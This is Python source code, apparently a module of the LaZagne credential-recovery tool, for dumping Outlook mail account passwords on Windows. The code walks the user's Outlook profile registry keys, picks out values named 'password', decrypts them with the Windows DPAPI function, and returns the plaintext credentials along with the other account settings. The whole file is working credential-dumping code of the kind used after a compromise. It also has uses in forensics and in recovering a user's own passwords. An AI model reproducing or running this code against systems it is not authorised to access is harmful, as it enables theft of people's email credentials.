from lazagne.config.write_output import print_debug
from lazagne.config.moduleInfo import ModuleInfo
from lazagne.config.WinStructure import *
from lazagne.config.constant import *
import _winreg

class Outlook(ModuleInfo):
	def __init__(self):
		options = {'command': '-o', 'action': 'store_true', 'dest': 'outlook', 'help': 'outlook - IMAP, POP3, HTTP, SMTP, LDPAP (not Exchange)'}
		ModuleInfo.__init__(self, 'outlook', 'mails', options, cannot_be_impersonate_using_tokens=True)

	def run(self, software_name = None):
		keyPath = 'Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook'
		try:
			hkey = _winreg.OpenKey(HKEY_CURRENT_USER, keyPath)
		except Exception,e:
			print_debug('DEBUG', '{0}'.format(e))
			print_debug('INFO', 'Outlook not installed or not profile saved')
			return

		num = _winreg.QueryInfoKey(hkey)[0]
		pwdFound = []
		for x in range(0, num):
			name = _winreg.EnumKey(hkey, x)
			skey = _winreg.OpenKey(hkey, name, 0, ACCESS_READ)
			
			num_skey = _winreg.QueryInfoKey(skey)[0]
			if num_skey != 0:
				for y in range(0, num_skey):
					name_skey = _winreg.EnumKey(skey, y)
					sskey = _winreg.OpenKey(skey, name_skey)
					num_sskey = _winreg.QueryInfoKey(sskey)[1]
					
					for z in range(0, num_sskey):
						k = _winreg.EnumValue(sskey, z)
						if 'password' in k[0].lower():
							values = self.retrieve_info(sskey, name_skey)

							if values:
								pwdFound.append(values)

			_winreg.CloseKey(skey)
		_winreg.CloseKey(hkey)
		return pwdFound
		
	def retrieve_info(self, hkey, name_key):
		values = {}
		num = _winreg.QueryInfoKey(hkey)[1]
		for x in range(0, num):
			k = _winreg.EnumValue(hkey, x)
			if 'password' in k[0].lower():
				try:
					password = Win32CryptUnprotectData(k[1][1:])
					values[k[0]] = password.decode('utf16')
				except Exception,e:
					print_debug('DEBUG', '{0}'.format(e))
					values[k[0]] = 'N/A'
			else:
				try:
					values[k[0]] = str(k[1]).decode('utf16')
				except:
					values[k[0]] = str(k[1])
		return values


